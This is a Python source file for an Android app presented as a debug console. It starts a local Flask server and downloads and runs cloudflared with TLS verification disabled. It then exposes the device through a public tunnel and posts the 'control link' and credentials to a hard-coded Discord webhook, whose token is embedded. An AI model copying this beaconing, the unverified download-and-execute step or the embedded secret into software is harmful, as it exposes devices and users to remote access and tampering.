import json
import os
import random
import re
import ssl
import string
import subprocess
import threading
import time
import traceback
import urllib.request

# ===== حل مشكلة شهادات SSL على الأندرويد =====
ssl._create_default_https_context = ssl._create_unverified_context
# ===============================================

from flask import Flask
from kivy.app import App
from kivy.clock import mainthread
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView

WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"

USERNAME = "3anoor-Omda"
PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
PORT = 5000

app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return f"<h1>Android Server Running</h1><p>User: {USERNAME}</p><p>Pass: {PASSWORD}</p>"

class DebugApp(App):
    def build(self):
        self.scroll = ScrollView()
        self.log_label = Label(
            text="=== Android Debug Console ===\n",
            size_hint_y=None,
            font_size='13sp',
            color=(0, 1, 0, 1),
            halign='left',
            valign='top'
        )
        self.log_label.bind(texture_size=lambda instance, value: setattr(instance, 'size', value))
        self.scroll.add_widget(self.log_label)
        return self.scroll

    @mainthread
    def log(self, text):
        print(text)
        self.log_label.text += f"{text}\n"

    def on_start(self):
        threading.Thread(target=self.run_flask, daemon=True).start()
        threading.Thread(target=self.start_tunnel, daemon=True).start()

    def run_flask(self):
        try:
            self.log("[INFO] Starting Flask localhost server...")
            app_flask.run(host='127.0.0.1', port=PORT)
        except Exception as e:
            self.log(f"[ERROR] Flask failed to start: {e}")

    def start_tunnel(self):
        time.sleep(1)
        try:
            save_dir = self.user_data_dir
            cf_bin = os.path.join(save_dir, "cloudflared")
            
            self.log(f"[INFO] Storage path: {cf_bin}")

            if not os.path.exists(cf_bin):
                self.log("[INFO] Downloading cloudflared (linux-arm64)...")
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
                
                # استخدام SSL غير مشفر لتجنب خطأ الشهادات على الأندرويد
                context = ssl._create_unverified_context()
                with urllib.request.urlopen(url, context=context) as response, open(cf_bin, 'wb') as out_file:
                    out_file.write(response.read())
                    
                self.log("[INFO] Download completed successfully!")
                self.log("[INFO] Setting execute permission (chmod 755)...")
                os.chmod(cf_bin, 0o755)

            self.log("[INFO] Starting cloudflared tunnel process...")
            cmd = [cf_bin, "tunnel", "--url", f"http://127.0.0.1:{PORT}"]
            
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                encoding="utf-8",
                errors="ignore",
                bufsize=1
            )

            url_found = False
            for line in iter(proc.stdout.readline, ""):
                if line:
                    clean_line = line.strip()
                    if "error" in clean_line.lower() or "failed" in clean_line.lower() or "trycloudflare" in clean_line:
                        self.log(f"[CF LOG] {clean_line}")

                    if "trycloudflare.com" in clean_line:
                        match = re.search(r"https://[a-zA-Z0-9\.\-]+\.trycloudflare\.com", clean_line)
                        if match:
                            found_url = match.group(0)
                            self.log(f"[SUCCESS] Public URL created: {found_url}")
                            self.send_to_discord(found_url)
                            url_found = True
                            break

            if not url_found:
                self.log("[WARN] Process stopped without providing a URL.")

        except Exception as e:
            self.log(f"[CRITICAL ERROR] {e}")
            self.log(f"[TRACEBACK]\n{traceback.format_exc()}")

    def send_to_discord(self, public_url):
        self.log("[INFO] Sending payload to Discord Webhook...")
        payload = {
            "embeds": [
                {
                    "title": "📱 تم تشغيل سيرفر الموبايل بنجاح!",
                    "color": 5814783,
                    "fields": [
                        {"name": "🔗 رابط التحكم المباشر", "value": f"[اضغط هنا]({public_url})\n`{public_url}`"},
                        {"name": "👤 Username", "value": f"`{USERNAME}`", "inline": True},
                        {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
                    ]
                }
            ]
        }
        try:
            data = json.dumps(payload).encode('utf-8')
            context = ssl._create_unverified_context()
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=data,
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            )
            res = urllib.request.urlopen(req, context=context)
            self.log(f"[SUCCESS] Discord Webhook response code: {res.getcode()}")
        except Exception as e:
            self.log(f"[ERROR] Failed to send to Discord: {e}")

if __name__ == "__main__":
    DebugApp().run()
